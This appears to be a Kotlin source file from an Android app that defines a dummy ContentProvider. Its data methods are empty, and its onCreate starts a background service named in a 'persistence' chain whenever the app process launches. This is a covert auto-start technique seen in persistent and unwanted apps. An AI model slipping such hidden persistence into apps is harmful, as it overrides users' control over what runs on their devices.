package org.synapse.core.persistence

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.util.Log

class AutoStartProvider : ContentProvider() {

    companion object {
        private const val TAG = "Synapse"
    }

    override fun onCreate(): Boolean {
        context?.let { ctx ->
            // Only start if not already running — prevents duplicate starts
            if (!PersistenceChain.isServiceRunning(ctx)) {
                Log.d(TAG, "AutoStart: service not running, starting")
                PersistenceChain.start(ctx)
            } else {
                Log.d(TAG, "AutoStart: service already running, skipping")
            }
        }
        return true
    }

    override fun query(uri: Uri, p: Array<out String>?, s: String?, sa: Array<out String>?, so: String?): Cursor = MatrixCursor(emptyArray())
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, s: String?, sa: Array<out String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, s: String?, sa: Array<out String>?): Int = 0
}
